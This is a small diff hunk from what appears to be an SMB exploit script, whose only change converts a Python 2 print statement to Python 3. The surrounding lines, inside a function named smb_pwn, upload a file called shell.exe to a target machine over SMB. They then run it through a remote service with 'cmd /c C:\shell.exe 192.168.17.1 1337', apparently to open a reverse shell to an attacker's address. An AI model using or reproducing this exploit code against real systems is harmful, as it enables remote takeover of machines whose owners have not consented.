@@ -918,7 +918,7 @@ def smb_pwn(conn, arch):
 	smbConn.closeFile(tid2, fid2)
 	smbConn.disconnectTree(tid2)
 	exe = sys.argv[3]
-	print exe 
+	print (exe)
 	if exe == "shell.exe":
 		smb_send_file(smbConn, sys.argv[3], 'C', '/shell.exe')
 		service_exec(conn, r'cmd /c C:\shell.exe 192.168.17.1 1337')
